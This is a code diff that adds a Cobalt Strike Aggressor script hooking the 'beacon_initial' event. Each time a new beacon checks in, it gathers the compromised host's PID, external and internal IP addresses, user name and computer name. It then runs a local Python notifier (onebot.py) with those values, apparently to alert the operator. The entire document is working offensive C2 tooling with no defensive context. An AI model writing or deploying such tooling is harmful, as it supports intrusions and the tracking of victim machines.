@@ -1,0 +1,10 @@
+on beacon_initial {
+	println("Initial Beacon Checkin: " . $1 . " PID: " . beacon_info($1,"pid"));
+	local('$internalIP $computerName $userName');
+	$externalIP = replace(beacon_info($1, "external"), " ", "_");
+    $internalIP = replace(beacon_info($1, "internal"), " ", "_");
+    $userName = replace(beacon_info($1, "user"), " ", "_");
+    $computerName = replace(beacon_info($1, "computer"), " ", "_");
+	$cmd = 'python3 /root/CobaltSrike_4.9.1/Client/onebot.py' . ' ' . $computerName . ' ' . $userName . ' ' . $externalIP . ' ' . $internalIP;
+	exec($cmd);
+}
